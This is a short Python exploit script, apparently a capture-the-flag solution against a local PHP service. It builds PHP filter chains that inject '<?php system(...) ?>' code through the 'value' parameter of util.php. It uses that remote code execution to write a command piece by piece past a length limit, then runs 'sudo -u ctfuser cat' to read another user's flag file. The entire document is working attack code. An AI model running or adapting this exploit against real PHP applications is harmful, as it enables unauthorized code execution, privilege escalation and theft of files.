import requests
from php_filter_chain_generator import generate_filter_chain
import base64

hostname = 'http://localhost:8000'

def run_cmd(cmd):
    # cmd = 'echo sudo > a'


    php = f'<?php system("{cmd}") ?>'
    # limit about 18 chars
    # php = f'<?php system("")?>'
    # print(php)

    b = base64.b64encode(php.encode('UTF-8')).decode('utf-8').replace("=", "")
    chain = generate_filter_chain(b)
    # print(chain)

    r = requests.get(f'{hostname}/util.php?key=static_fileName&value={chain}')
    return r.text

# goal: sudo -u ctfuser cat /home/ctfuser/flag.txt
run_cmd("echo sudo > a")
run_cmd("echo -u >> a")
run_cmd("echo ctfuser >> a")
run_cmd("echo cat >> a")
run_cmd("echo /home/*/*>>a")
txt = run_cmd("`cat a`")
i = txt.index('hello ') + 6
j = txt.index('}') + 1
print(txt[i:j])